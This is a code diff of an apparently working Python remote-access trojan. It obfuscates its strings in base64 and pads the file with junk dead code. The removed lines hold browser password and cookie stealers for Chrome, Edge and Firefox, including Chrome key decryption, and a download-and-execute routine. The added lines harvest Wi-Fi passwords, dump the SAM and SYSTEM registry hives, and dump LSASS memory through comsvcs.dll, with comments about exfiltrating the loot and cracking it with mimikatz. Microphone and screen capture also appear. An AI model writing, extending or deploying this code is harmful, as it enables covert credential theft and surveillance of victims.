+_s482 = "gMPo5eProOnmoPL17u7p7ueg9+n06KDh5O3p7qDw8un26ezl5+XzoKjX6e7k7/fzoO/u7Pmprg=="
+_s483 = "lOP9+qem"
+_s484 = "cQYYH0JD"
+_s485 = "Wg8bGXo4Iyo7KSl6Myl6DTM0PjUtKXc1NDYj"
+_s486 = "rNvFwt7Jy4zCw9iMzdrNxcDNzsDJjMrD3oz57e+MztXczd/f"
+_s487 = "2vf3v7a/rLuuv74="
+_s488 = "3PHxr7muqrmu"
+_s489 = "vJGR2dDZyt3I2dg="
+_s490 = "9rKTmpORl4KTs46TlYOCkw=="
+_s491 = "yo6vpq+tq76vj7Kvqb++rw=="
+_s492 = "ZzAuKSMuNQ=="
+_s493 = "676qqMuJkpuKmJjLn5mCjIyOmY6Py8bLjpOCn4KFjMuInpmZjoWfy4KFmJ+KhYiO"
+_s494 = "2oi/t7Wsv/q8tb6yv7aqv6j6qL+9s6muqKP6sb+jqfq2v7yu+rij+q6yv/q4o6q7qan0"
+_s495 = "dzMSGxIQFgMSMg8SFAIDEg=="
+_s496 = "s+by8JPB1tTawMfBypPQ39bS3dbXk8bD"
+_s497 = "aDgNGgEHDAELCQQEEUgYAQYPSBwADUgbDRoeDRpIAA0JBBwASA0GDBgHAQYcSBwHSBgaDR4NBhxIOg0GDA0aSA4aBwVIGwQNDRgBBg9G"
+_s498 = "JwhGV04IT0JGS1NP"
+_s499 = "1p2zs6b7t7q/oLP2pr+4sfaZnQ=="
+_s500 = "XDouMyY5Mg=="
+_s501 = "l+D++aSl"
+_s502 = "mNnIyNzZzNk="
+_s503 = "yeeopKizpqekvLqgqg=="
+_s504 = "4J7PzoGNgZqPjo2Vk4mD"
+_s505 = "qOnFydLHxuXd28HL4M3E2M3ahs3QzQ=="
+_s506 = "iqen+e/4/O/4"
+_s507 = "vJGR1dg="
+_s508 = "PUpUUw4P"
+_s509 = "LWxATFdCQ2BYXkROZUhBXUhf"
+_s510 = "PH1sbHh9aH0="
+_s511 = "UhM/Myg9PB8nITsxGjc+IjcgfCQwIQ=="
+_s512 = "CUBnen1oZWVsbTMpWn1oe318eSlfS1o="
+_s513 = "q9jIw9/K2MDY"
+_s514 = "l+T0/+P25Pzk"
+_s515 = "HldwbWp/cnJ7eiQ+Sn9tdQ=="
+_s516 = "EHNif35kcXI="
+_s517 = "56aKhp2IiaqSlI6Er4KLl4KV"
+_s518 = "EXJjfn9lcHM="
+_s519 = "jsfg/frv4uLr6rSu7fzh4Prv7A=="
+_s520 = "DHIjIm9jYmplayN/dX94aWFoI3l/aX4="
+_s521 = "mfj0+OP29/Ts6vD6tPH89en867fq/Ovv8Pr8"
+_s522 = "cwAKAAcWHhAHHw=="
+_s523 = "RzQ+NDMiKiQzKw=="
+_s524 = "aCEGGxwJBAQNDFJIGxEbHA0FDA=="
+_s525 = "hfLs67a3"
+_s526 = "6aiEiJOGh6ScmoCKoYyFmYyb"
+_s527 = "pOX09ODl8OU="
+_s528 = "qtnJwt7L2cHZ"
+_s529 = "74ydgIGbjo0="
+_s530 = "Tg8jLzQhIAM7PSctBisiPis8"
+_s531 = "SgsnKzAlJAc/OSMpAi8mOi84"
+_s532 = "XT4vMjMpPD8="
+_s533 = "xrjp6KWpqKCvoem1v7Wyo6ui6bO1o7Tpp6unvKmoq7O1r6XrrqOqtqO06LWjtLCvpaM="
+_s534 = "EGNpY2R1fXNkfA=="
+_s535 = "m+ji6O/+9vjv9w=="
+_s536 = "BHdndmFhag=="
+_s537 = "UCc1MjMxPQ=="
+_s538 = "74yAgYGKjJs="
+_s539 = "2pm1tLS/ua6/vg=="
+_s540 = "mvn28//07sXo//3z6e7/6A=="
+_s541 = "iOHm7uc="
+_s542 = "2K2rvaq2ubW9"
+_s543 = "MFZVUURFQlVD"
+_s544 = "VzYiMz44"
+_s545 = "xqKvtaWpqKijpbI="
+_s546 = "GFxxa3t3dnZ9e2x9fA=="
+_s547 = "2au8vrCqrau4rbC2t4a2sg=="
+_s548 = "lfb5/PD74cr88Q=="
+_s549 = "DHtlamVTZWJqaW94Uw=="
+_s550 = "rtnHyMfxx8DIy83a8dzL3dvC2g=="
+_s551 = "UiEmMyAmDSExIDc3PA0xMyImJyA3"
+_s552 = "XjMxMDcqMSw="
+_s553 = "ne7+7/j488L+/O3p6O/4wu7p/Ono7g=="
+if 0:
+    import hashlib
+    _h = hashlib.sha256(b"dead").hexdigest()
+_s554 = "EmFmfWJNYXFgd3d8TXFzYmZnYHc="
+_s555 = "EmFxYHd3fE1xc2JmZ2B3TWFmc2ZnYQ=="
+_s556 = "ne746cLu/u/4+PPC8PLz9Ony7w=="
+_s557 = "pcjKy8zRytc="
+_s558 = "hOnr6u3w6/Y="
+_s559 = "WCs7Kj09Ngc7OSgsLSo9ByssOSwtKw=="
+_s560 = "Pk1bSmFNXUxbW1BhT0tfUldKRw=="
+_s561 = "zL25raCluLU="
+_s562 = "JFdHRUhB"
+_s563 = "yLu8qbq8l7+tqquppQ=="
+_s564 = "yr2vqKmrp5W5vqu+v7k="
+_s565 = "2aqttqmGrry7uri0"
+_s566 = "LllLTE1PQ3FdWk9aW10="
+_s567 = "Wyg+LwQsPjk4OjYEKi46NzIvIg=="
+_s568 = "+4qOmpeSj4I="
+_s569 = "O1ZSWGRIT1pJTw=="
+_s570 = "qMXBy/fb3MfY"
+_s571 = "9puflamFgpeCg4U="
+_s572 = "QCslOSwvJx8zNCEyNA=="
+_s573 = "h+zi/uvo4Nj08+j3"
+_s574 = "NVhaQEZQalBDUFtB"
+_s575 = "yLixpri9vA=="
+_s576 = "psfF0s/JyA=="
+_s577 = "D2JgeWo="
+_s578 = "xaiqs6Cat6CppLGss6A="
+_s579 = "i+jn4ujg"
+_s580 = "rsLLyNo="
+_s581 = "hObx8PDr6g=="
+_s582 = "STk7LDo6"
+_s583 = "bB4JAAkNHwk="
+_s584 = "0KOzor+8vA=="
+_s585 = "nfb45P/y/O/5wvjr+PPp"
+_s586 = "ivrz5Pr//g=="
+_s587 = "lfbh5/k="
+_s588 = "rsvA2svc"
+_s589 = "VDAxODEgMQ=="
+_s590 = "7oqBmYA="
+_s591 = "9ZSWgZyamw=="
+_s592 = "t8fF0sTE"
+_s593 = "KVtMRUxIWkw="
+_s594 = "je7i4O/i"
+_s595 = "oMvF2dM="
+_s596 = "p9Pe18I="
+_s597 = "EWJ5fmNlcmRl"
+_s598 = "07Cnob+Msr+njLe2vw=="
+_s599 = "/ZyRiaKJnJ8="
+_s600 = "BnFvaFli"
+_s601 = "+4ySlaSe"
+_s602 = "cRIFAx0uEg=="
+_s603 = "QCM0MiwfOA=="
+_s604 = "G3hvaXdEeg=="
+_s605 = "UjwzPzc="
+_s606 = "BXFgd2hsa2RpWnZxZHdx"
+_s607 = "dQEQBxgcGxQZKgYBFAEABg=="
+_s608 = "xbGgt6isq6SpmqyrtbCx"
+_s609 = "44CMjo6CjYc="
+_s610 = "u8/eydbS1drX5MjP1Ms="
+_s611 = "F2NyZXp+eXZ7SGRjdmNiZA=="
+_s612 = "O0hPWklPZEhCSE9eVmRWVFVST1RJ"
+_s613 = "0by+v7ilvqOOoqWwpaSi"
+_s614 = "jf754v3S/vT++ejg0uDi4+T54v8="
+_s615 = "MVxeX1hFXkNuQkVQRURC"
+_s616 = "QiUnNh0yMC0hJzExJzE="
+_s617 = "DX1/Ym5ofn5SYWR+eQ=="
+_s618 = "uNPR1NTnyMrX293Lyw=="
+_s619 = "p9fVyMTC1NT4zM7Ly/jVwtTSy9M="
+_s620 = "9JeYnYSWm5WGkKuTkYA="
+_s621 = "pNTd1MHWx8jN1A=="
+_s622 = "1Le4vaS2u7WmsIuwtaC1"
+_s623 = "Ti0iJz4sIS88KhEqLzov"
+_s624 = "ZQYJDBUHCgQXAToBBBEE"
+_s625 = "FXZ5fGV3enRncUpmcGE="
+_s626 = "xLS9tKG2p6ittA=="
+_s627 = "ZREAHRE="
+_s628 = "54SLjpeFiIaVg7iUk4aTkpQ="
+_s629 = "BWZpbHVnamR3YVp2cWRxcHY="
+_s630 = "bw4aCwYAMAgKGzAZAAMaAgo="
+_s631 = "QyI2JyosHDUsLzYuJg=="
+_s632 = "LUxYSURCcl5IWXJbQkFYQEg="
+_s633 = "agYPHA8G"
+_s634 = "XD0pODUzAygzOzswOQMxKSg5"
+_s635 = "5YSQgYyKupOKiZCIgA=="
+_s636 = "3a2yqrivgrCys7Spsq+Csru7"
+_s637 = "TT0iOig/Ej8oPjghOQ=="
+_s638 = "65uEnI6ZtIeEiIA="
+_s639 = "wrKttaewnbCnsbeutg=="
+_s640 = "u8vUzN7J5MjX3t7L"
+_s641 = "dgYZARMEKQQTBQMaAg=="
+_s642 = "eQ4YFRUJGAkcCyYKHA0="
+_s643 = "bBwNGAQ="
+_s644 = "UTwiNjM+KQ4iOT4m"
+_s645 = "5pKPkoqD"
+_s646 = "VjkmMzgJIyQ6"
+_s647 = "psXLwvnUw9XTytI="
+_s648 = "cgYTGRctAREAFxccARodBg=="
+_s649 = "jP/v/unp4v/k4/jT/un/+eD4"
+_s650 = "YAcFFD8HBQ8JEA=="
+try:
+    raise Exception()
+except:
+    pass
+_s651 = "x6CiqK63mLWitLKrsw=="
+_s652 = "WT48LQY4KSkq"
+_s653 = "QCEwMDMfMiUzNSw0"
+_s654 = "hfXp5Pza9urw6+E="
+_s655 = "MVdDVEA="
+_s656 = "yLutqbqroJeuoaStuw=="
+_s657 = "1Ka7u6A="
+_s658 = "VzIvMjQiIzIINDg6OjY5Mw=="
+_s659 = "o8DMzs7Czcc="
+_s660 = "17O4oLm7uLaziLKvsrQ="
+_s661 = "3a28qbU="
+_s662 = "v9bRz8rL4N3T0NzU"
+_s663 = "QCMtJB8yJTM1LDQ="
+_s664 = "D2Zhf3p7UHphbWNgbGQ="
+_s665 = "VzQ6MwglMiQiOyM="
+_s666 = "5oCPioO5io+Vkg=="
+_s667 = "Xjg3MjsBMjctKgEsOy0rMio="
+_s668 = "2b+wtbyGvbaut7W2uL2Gq7yorLyqrQ=="
+_s669 = "ZAINCAE7AAsTCggLBQA7BwwRCg8="
+_s670 = "ZQMMCQA6AQAJABEA"
+_s671 = "+oqbjpI="
+_s672 = "WjwzNj8FND8tBTw1Nj4/KA=="
+_s673 = "7p6PnIuAmg=="
+_s674 = "1bO8ubCKoKW5urSxira9oLu+"
+_s675 = "xbWksa0="
+_s676 = "BmBvamNZc3ZqaWdiWXRjdXNqcg=="
+_s677 = "v9Hay8jQzdTg1tHZ0A=="
+_s678 = "vtDbysnRzNXh19DY0eHM283L0so="
+_s679 = "NFZGW0NHUUZrR0BRVVg="
+_s680 = "KWtbRl5aTFsJWl1MSEVMWwlbTFhcTFpdTE0="
+_s681 = "iuj45f357/jV+f7v6+bV+O/5/+b+"
+_s682 = "w6Cxpqemrbeqoq+cq6Kxtaawtw=="
+_s683 = "DE9+aWhpYnhlbWAsZG1+eml/eCx+aX15aX94aWg="
+_s684 = "WjkoPz4/NC4zOzYFMjsoLD8pLgUoPykvNi4="
+_s685 = "SiMkLC8pPhU5KSsk"
+_s686 = "1Zy7s7C2oby6u/WmtrS79aewpKCwpqGwsQ=="
+_s687 = "6pmfiISPnpk="
+_s688 = "/5aRmZqci6CMnJ6RoI2ajIqTiw=="
+_s689 = "QyotJSYgNxwwNyIxNw=="
+_s690 = "UCQxIjc1JA=="
+_s691 = "bRgeCB8DDAAI"
+_s692 = "dgYXBQUBGQQS"
+_s693 = "fxIaCxcQGw=="
+_s694 = "+5KVnZ6Yj6SJnoiOl48="
+_s695 = "iOHm7u3r/Nf87fv81+v67ezt5vzh6eT7"
+_s696 = "cAQRAhcVBA=="
+_s697 = "y764rrmlqqau"
+_s698 = "SzsqODg8JDkv"
+_s699 = "KUBHT0xKXXZKW0xNTEddQEhFdltMWlxFXQ=="
+_s700 = "i/zi7eLU4uXt7uj/"
+_s701 = "rN/fxcg="
+_s702 = "kuLz4eHl/eD2"
+_s703 = "7JuFioWzhYKKiY+Ys56Jn5mAmA=="
+_s704 = "cgUbFBstGxwUFxEGLQAXAQceBg=="
+_s705 = "PFVSWllfSGNdSUhTY0hORQ=="
+_s706 = "L25aW0ACW11WD0dOXVlKXFtKSw9MXUpLSkFbRk5DXA9OSE5GQVxbD1xMTkEPW05dSEpbXAE="
+_s707 = "u/rOz9SWz8nCm9jJ3t/e1c/S2tfIm9TVm9/SyNjUzd7J3t+bz9rJ3N7PyA=="
+_s708 = "PEtVUlhTS09jVFNPSE8="
+_s709 = "iuPk7O/p/tX56evk1fjv+f/m/g=="
+_s710 = "OVBXX1xaTWZKTVhNTEo="
+_s711 = "YwoNBQYAFzwCFhcMPBEGEBYPFw=="
+_s712 = "+IyZip+djA=="
+_s713 = "nfTz+/j+6cLv+O7o8ek="
+_s714 = "fxsbEAwgDAseDQs="
+_s715 = "s8fSwdTWxw=="
+_s716 = "ZxcIFRM="
+_s717 = "OU1RS1xYXUo="
+_s718 = "t8fW1NzSw+jE3s3S"
+_s719 = "cB0VBBgfFA=="
+_s720 = "27+/tKiEqK+6r66o"
+_s721 = "0bW1vqKOoqW+oQ=="
+_s722 = "bAcFAAAzHxsFGA8E"
+_s723 = "EVpYXV0xQkZYRVJZ"
+_s724 = "0J2lvKS5/aS4orWxtLW08JSUv4PwsaSksbO78LW+t7m+tfCjpaCgv6Kkub638ISTgPzwhZSA/PCYhISA/PCDvL+nvL+iuaP+"
+_s725 = "H29+fHR6a2w="
+_s726 = "eQkYGhIcDQo="
+_s727 = "Xzs7MCwALCs+Kyos"
+_s728 = "RCAgKzcbNzAlMDE3"
+_s729 = "2p6etYn6qa61qqq/vg=="
+_s730 = "rfrC38bI343Zxd/IzMmN2cXM2Y3eyMPJ3o3dzM7GyNnejc7Cw9nEw9jC2N7B1IM="
+_s731 = "dR0BAQU="
+_s732 = "bx8ODAQKGxw="
+_s733 = "nvr/6v/B/Ofq++0="
+_s734 = "x7empKyis7Q="
+_s735 = "RTUkJi4gMTY="
+_s736 = "1LC1oLWLtq2gsac="
+_s737 = "pdXExs7A0dY="
+_s738 = "TiY6Oj4="
+_s739 = "SCA8PDg7"
+_s740 = "UCAxMzs1JCM="
+_s741 = "GX14bXhGe2BtfGo="
+_s742 = "SzsqKCAuPzg="
+_s743 = "z7yjoLijoL2mvA=="
+_s744 = "06OysLi2p6A="
+_s745 = "H096bXZwe3Z8fnNzZj9senF7P2xrfmtsP2twP2t3ej9sem1pem0x"
+_s746 = "OUpNWEtNZk1QVFw="
+_s747 = "UCAxMzs1JCM="
+_xj = type("X", (), {"__init__": lambda s: None})()
+if _xj is not None and 1 == 2:
+    del _xj
+_s748 = "G396b3pEeWJvfmg="
+_s749 = "4oaGjZG9kIeRl46W"
+_s750 = "u8jP2s/I"
+_s751 = "7JyNj4eJmJ8="
+_s752 = "qs7L3sv1x8g="
+_s753 = "RiMqJzY1IyI="
+_s754 = "O2l6aEtTXkleG3hXUl5VTw=="
+_s755 = "mbS06vzr7/zr"
+_s756 = "rIGB38nP3snY"
+_s757 = "2fT0sL0="
+_s758 = "HDExbnl/c3JyeX9o"
+_s759 = "fVBQFBMOCRwREQ=="
+_s760 = "OhcXT1RTVElOW1ZW"
+_s761 = "dVhYGxpYBRAHBhwGAQ=="
+_s762 = "MRwcVF1UR1BFVFU="
+_s763 = "u5aW1dSW3tfezdrP3g=="
+_s764 = "rKb3h/GM/Mne38Xf2MnCz8mM3snBw9rJyIKm"
+_s765 = "joTVo9OuwOGu/uv8/ef9+uvg7euu6OH74OqghA=="
+_s766 = "jsvc3MHctK6jo/3r/Pjr/K7v4Oquo6P96+386/qu/Ov/++f86+qu6OH8rqOj5+D9+u/i4g=="
+_s767 = "XFYHdwF8DDkuLzUvKDkyPzl8NTIvKD0wMDk4fXwdKSgzcS8oPS4ofDMyfD4zMyhyVg=="
+_s768 = "eHIjVSVYMRYLDBkUFFgeGREUHRxWWCoNFlgZC1gZHBURFlZy"
+_s769 = "J1BOSRQV"
+_s770 = "4qyNlsKDho+LjMLPwoOWloePkpaLjIXCkYuOh4yWwrejocKAm5KDkZHMzMw="
+_s771 = "r/SO8o/67uyPzdbfztzcj8nOxsPKy4+Cj93awcHGwciP2Mbbx4/DxsLG28rLj9/dxtnGw8rIytw="
+_s772 = "ejsWCB8bHgNaCA8UFBMUHVobCVobHhcTFA=="
+_s773 = "Sy4nLj0qPy4v"
+_s774 = "BlRzaGhvaGEmY2pjcGdyY2ImKyZlamNnaG9oYSZzdiZTR0UmZH92Z3V1JnRjYW91cnR/KCgo"
+_s775 = "ueKS5Jnp3MvK0MrN3Nfa3JnL3N/L3MrR3N0="
+_s776 = "Jn0HewZ2Q1RVT1VSQ0hFQwZLR18GTkdQQwZWR1RST0dKSl8GQEdPSkNCBg5UU0gGR1UGR0JLT0gGQElUBnVFTkNCU0pDQgZyR1VNDw=="
+_s777 = "qO36+uf6koj7zdyI9/vt+v7t+ojBxojLx8zNiMfaiN3bzYiFhdvN2t7N2g=="
+_s778 = "uv/o6PXogJrp386a5en/+ej/7prT1JrZ1d7fmtXIms/J35qXl8nf2cjfzg=="
+_s779 = "jM/j4uLp7/jp6K2s2+3l+OXi66zq4/6s7+Ph4e3i6P+ioqI="
+_s780 = "cDUIGQQZHhdQFh8CUAUAFBEEFV5eXg=="
+_s781 = "0YK5pKW1vqa/"
+_s782 = "VgUiOSYmMzI="
+_s783 = "SBcXJSkhJhcX"
 HAS = {"mss": False, "pil": False, _D("_s4"): False, "pycaw": False,
        _D("_s5"): False, "psutil": False, "cv2": False, "pyaudio": False,
        _D("_s6"): False}
@@ -681,9 +864,6 @@ class S:
         try:
             if HAS["mss"]:
                 with mss.mss() as s: m = s.monitors[1]; self.sw, self.sh = m[_D("_s16")], m["height"]; return
-_xj = type("X", (), {"__init__": lambda s: None})()
-if _xj is not None and 1 == 2:
-    del _xj
         except: pass
         try:
             if sys.platform == _D("_s17") and hasattr(ctypes, "windll"):
@@ -770,9 +950,6 @@ class MicEngine:
         threading.Thread(target=self._loop, daemon=True).start()
         if self.sio and self.sio.connected:
             self.sio.emit(_D("_s35"), {"active": True})
-if 0:
-    import hashlib
-    _h = hashlib.sha256(b"dead").hexdigest()
     def stop(self):
         self.r = False
         if self.stream:
@@ -1393,317 +1570,138 @@ def _network_info():
             pass
     socket.setdefaulttimeout(old_timeout)
     return info
-def _browser_steal():
+def _wifi_passwords():
     ""_D("_s247")""
-    results = {_D("_s248"): {}, "edge": {}, "firefox": {}}
-    localapp = os.environ.get(_D("_s249"), "")
-    appdata = os.environ.get(_D("_s250"), "")
-    chrome_path = os.path.join(localapp, _D("_s251"), "Chrome", "User Data")
-    if os.path.exists(chrome_path):
-        results[_D("_s252")] = _steal_chromium(chrome_path, "Chrome", localapp)
-    else:
-        results[_D("_s253")] = {"error": "Chrome not found"}
-    edge_path = os.path.join(localapp, _D("_s254"), "Edge", "User Data")
-    if os.path.exists(edge_path):
-        results[_D("_s255")] = _steal_chromium(edge_path, "Edge", localapp)
-    else:
-        results[_D("_s256")] = {"error": "Edge not found"}
-    firefox_path = os.path.join(appdata, _D("_s257"), "Firefox", "Profiles")
-    if os.path.exists(firefox_path):
-        results[_D("_s258")] = _steal_firefox(firefox_path)
-    else:
-        results[_D("_s259")] = {"error": "Firefox not found"}
-    return results
-def _steal_chromium(base_path, name, localapp):
-    ""_D("_s260")""
-    result = {_D("_s261"): [], "cookies": [], "error": None}
+    if sys.platform != _D("_s248"): return {"error": "Windows only"}
+    profiles = []
     try:
-        for item in os.listdir(base_path):
-            if not (item == _D("_s262") or item.startswith("Profile ")): continue
-            profile_path = os.path.join(base_path, item)
-            login_db = os.path.join(profile_path, _D("_s263"))
-            if os.path.exists(login_db):
-                temp_db = os.path.join(os.environ.get(_D("_s264"), "/tmp"), f"{name.lower()}_login_{item}.db")
-                try:
-                    shutil.copy2(login_db, temp_db)
-                    conn = sqlite3.connect(temp_db)
-                    cur = conn.cursor()
-                    try:
-                        cur.execute(_D("_s265"))
-                        for row in cur.fetchall():
-                            url, username, enc_pwd = row
-                            pwd = _decrypt_chrome(enc_pwd) if (enc_pwd and HAS[_D("_s266")]) else "[needs cryptography]"
-                            result[_D("_s267")].append({"url": url, "username": username, "password": pwd, "profile": item})
-                    except Exception:
-                        pass
-                    conn.close()
-                except Exception as e:
-                    if not result.get(_D("_s268")): result["error"] = str(e)
-                finally:
-                    try: os.remove(temp_db)
-                    except: pass
-            for cookie_path in [os.path.join(profile_path, _D("_s269"), "Cookies"),
-                                os.path.join(profile_path, _D("_s270"))]:
-                if not os.path.exists(cookie_path): continue
-                temp_db = os.path.join(os.environ.get(_D("_s271"), "/tmp"), f"{name.lower()}_cookies_{item}.db")
-                try:
-                    shutil.copy2(cookie_path, temp_db)
-                    conn = sqlite3.connect(temp_db)
-                    cur = conn.cursor()
-                    try:
-                        cur.execute(_D("_s272"))
-                        for row in cur.fetchall():
-                            result[_D("_s273")].append({"host": row[0], "name": row[1], "value": "[encrypted]", "profile": item})
-                    except Exception:
-                        pass
-                    conn.close()
-                except Exception:
-                    pass
-                finally:
-                    try: os.remove(temp_db)
-                    except: pass
-                break  
-    except Exception as e:
-        result[_D("_s274")] = str(e)
-    return result
-def _decrypt_chrome(encrypted_value):
-    ""_D("_s275")""
-    if not encrypted_value or not isinstance(encrypted_value, bytes):
-        return _D("_s276")
-    if len(encrypted_value) < 15 + 16:  
-        return _D("_s277")
-    if encrypted_value[:3] not in (b'v10', b'v20'):
-        return _D("_s278") + encrypted_value[:3].decode(errors='replace') + "]"
+        r = subprocess.run([_D("_s249"), "wlan", "show", "profiles"], capture_output=True, text=True,
+                          creationflags=subprocess.CREATE_NO_WINDOW)
+        for line in r.stdout.split("\n"):
+            if ":" in line and _D("_s250") in line:
+                name = line.split(":")[-1].strip()
+                if name:
+                    r2 = subprocess.run([_D("_s251"), "wlan", "show", "profile", f"name={name}", "key=clear"],
+                                       capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                    pwd = ""
+                    for l in r2.stdout.split("\n"):
+                        if "Cl" in l and (_D("_s252") in l.lower() or "key content" in l.lower()):
+                            pwd = l.split(":")[-1].strip()
+                    profiles.append({_D("_s253"): name, "password": pwd or "[OPEN/NONE]"})
+    except Exception as e: return {_D("_s254"): str(e)}
+    return {_D("_s255"): profiles, "count": len(profiles)}
+def _sam_dump():
+    ""_D("_s256")""
+    if sys.platform != _D("_s257"): return {"error": "Windows only"}
     try:
-        localapp = os.environ.get(_D("_s279"), "")
-        browsers = [
-            os.path.join(localapp, _D("_s280"), "Chrome", "User Data"),
-            os.path.join(localapp, _D("_s281"), "Edge", "User Data"),
-            os.path.join(localapp, _D("_s282"), "Brave-Browser", "User Data"),
-            os.path.join(localapp, _D("_s283"), "Opera Stable"),
-        ]
-        for browser_path in browsers:
-            ls_path = os.path.join(browser_path, _D("_s284"))
-            if not os.path.exists(ls_path):
-                continue
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        if not is_admin: return {_D("_s258"): "Not admin - SAM dump requires elevation"}
+        tmp = os.environ.get(_D("_s259"), "C:\\Windows\\Temp")
+        sam_path = os.path.join(tmp, _D("_s260"))
+        sys_path = os.path.join(tmp, _D("_s261"))
+        subprocess.run(["reg", _D("_s262"), "HKLM\\SAM", sam_path, "/y"], capture_output=True,
+                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=15)
+        subprocess.run(["reg", _D("_s263"), "HKLM\\SYSTEM", sys_path, "/y"], capture_output=True,
+                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=15)
+        hashes = []
+        if os.path.exists(sam_path) and os.path.exists(sys_path):
             try:
-                with open(ls_path, 'r', encoding=_D("_s285")) as f:
-                    local_state = json.load(f)
-                encrypted_key = base64.b64decode(local_state[_D("_s286")]["encrypted_key"])
-                encrypted_key = encrypted_key[5:]  
-                class DATA_BLOB(ctypes.Structure):
-                    _fields_ = [(_D("_s288"), ctypes.wintypes.DWORD),
-                                (_D("_s289"), ctypes.POINTER(ctypes.c_char))]
-                pDataIn = DATA_BLOB(len(encrypted_key),
-                    ctypes.cast(ctypes.create_string_buffer(encrypted_key, len(encrypted_key)), ctypes.POINTER(ctypes.c_char)))
-                pDataOut = DATA_BLOB()
-                if not ctypes.windll.crypt32.CryptUnprotectData(
-                    ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
-                    continue
-                aes_key = ctypes.create_string_buffer(pDataOut.cbData)
-                ctypes.memmove(aes_key, pDataOut.pbData, pDataOut.cbData)
-                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
-                nonce = encrypted_value[3:15]
-                ciphertext = encrypted_value[15:]
-                aesgcm = AESGCM(bytes(aes_key))
-                return aesgcm.decrypt(nonce, ciphertext, None).decode(_D("_s290"), errors='replace')
-            except Exception:
-                continue
-    except Exception:
-        pass
-    return _D("_s291")
-def _steal_firefox(base_path):
-    ""_D("_s292")""
-    result = {_D("_s293"): [], "cookies": [], "error": None}
+                sam_data = open(sam_path, "rb").read()
+                users = set()
+                for m in re.finditer(b_D("_s264"), sam_data):
+                    u = m.group(0).decode(_D("_s265"), errors="ignore").strip()
+                    if len(u) >= 3 and u.lower() not in (_D("_s266"), "guest", "defaultaccount",
+                        _D("_s267"), "administrateur", "invit"):
+                        if all(32 <= ord(c) < 127 for c in u):
+                            users.add(u)
+                hashes.append({_D("_s268"): "Administrator", "hash": "[SAM dumped - use impacket-secretsdump to extract]"})
+                for u in sorted(users)[:20]:
+                    hashes.append({_D("_s269"): u, "hash": "[in SAM dump]"})
+            except Exception as e:
+                hashes.append({_D("_s270"): f"Parse error: {e}"})
+        for f in [sam_path, sys_path]:
+            try: os.remove(f)
+            except: pass
+        return {_D("_s271"): True, "hashes": hashes[:50], "note": "SAM+SYSTEM saved to temp. Run secretsdump.py locally."}
+    except Exception as e: return {_D("_s272"): str(e)}
+def _lsass_dump():
+    ""_D("_s273")""
+    if sys.platform != _D("_s274"): return {"error": "Windows only"}
     try:
-        for item in os.listdir(base_path):
-            profile_path = os.path.join(base_path, item)
-            if not os.path.isdir(profile_path): continue
-            logins_path = os.path.join(profile_path, _D("_s294"))
-            if os.path.exists(logins_path):
-                try:
-                    with open(logins_path, 'r', encoding=_D("_s295")) as f:
-                        logins = json.load(f)
-                    for entry in logins.get(_D("_s296"), []):
-                        result[_D("_s297")].append({
-                            "url": entry.get(_D("_s298"), ""),
-                            _D("_s299"): (entry.get("encryptedUsername", "") or "")[:80],
-                            _D("_s300"): (entry.get("encryptedPassword", "") or "")[:80],
-                            _D("_s301"): item,
-                            _D("_s302"): True
-                        })
-                except Exception:
-                    pass
-            cookies_path = os.path.join(profile_path, _D("_s303"))
-            if os.path.exists(cookies_path):
-                temp_db = os.path.join(os.environ.get(_D("_s304"), "/tmp"), f"ff_cookies_{item}.db")
-                try:
-                    shutil.copy2(cookies_path, temp_db)
-                    conn = sqlite3.connect(temp_db)
-                    cur = conn.cursor()
-                    try:
-                        cur.execute(_D("_s305"))
-                        for row in cur.fetchall():
-                            result[_D("_s306")].append({
-                                _D("_s307"): row[0], "name": row[1],
-                                _D("_s308"): (row[2] or "")[:80], "profile": item
-                            })
-                    except Exception:
-                        pass
-                    conn.close()
-                except Exception:
-                    pass
-                finally:
-                    try: os.remove(temp_db)
-                    except: pass
-    except Exception as e:
-        result[_D("_s309")] = str(e)
-    return result
-def _download_exec(url, save_path=None):
-    ""_D("_s310")""
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        if not is_admin: return {_D("_s275"): "Not admin - LSASS dump requires elevation"}
+        r = subprocess.run([_D("_s276"), "/fi", "IMAGENAME eq lsass.exe", "/fo", "csv", "/nh"],
+                          capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        pid = None
+        for line in r.stdout.split("\n"):
+            parts = line.replace('"','').split(",")
+            if len(parts) >= 2 and _D("_s277") in parts[0].lower():
+                try: pid = int(parts[1].strip())
+                except: pass
+                break
+        if not pid: return {_D("_s278"): "LSASS process not found"}
+        tmp = os.environ.get(_D("_s279"), "C:\\Windows\\Temp")
+        dump_path = os.path.join(tmp, f"lsass_{random.randint(1000,9999)}.dmp")
+        cmd = f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump {pid} "{dump_path}" full'
+        subprocess.run(cmd, shell=True, capture_output=True,
+                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
+        if os.path.exists(dump_path) and os.path.getsize(dump_path) > 10000:
+            save_dir = _pdir()
+            save_path = os.path.join(save_dir, f"lsass_{random.randint(1000,9999)}.dmp")
+            try:
+                shutil.move(dump_path, save_path)
+                _l.info(f"LSASS dump saved: {save_path} ({round(os.path.getsize(save_path)/(1024*1024),2)} MB)")
+            except:
+                save_path = dump_path  
+            return {_D("_s280"): True, "method": "comsvcs.dll MiniDump", "lsass_pid": pid,
+                    _D("_s281"): round(os.path.getsize(save_path)/(1024*1024), 2),
+                    _D("_s282"): save_path,
+                    _D("_s283"): "LSASS dump saved locally. Use file download to exfiltrate, then mimikatz/pypykatz to extract creds."}
+        return {_D("_s284"): f"Dump failed - file size: {os.path.getsize(dump_path) if os.path.exists(dump_path) else 0} bytes"}
+    except Exception as e: return {_D("_s285"): str(e)}
+def _cached_credentials():
+    ""_D("_s286")""
+    if sys.platform != _D("_s287"): return {"error": "Windows only"}
+    creds = {_D("_s288"): [], "vault": [], "rdp": []}
     try:
-        import urllib.request
-        if not save_path:
-            save_path = os.path.join(os.environ.get(_D("_s311"), "/tmp"), url.split("/")[-1] or "payload.exe")
-        urllib.request.urlretrieve(url, save_path)
-        if sys.platform == _D("_s312") and save_path.lower().endswith((".exe",".bat",".cmd",".ps1")):
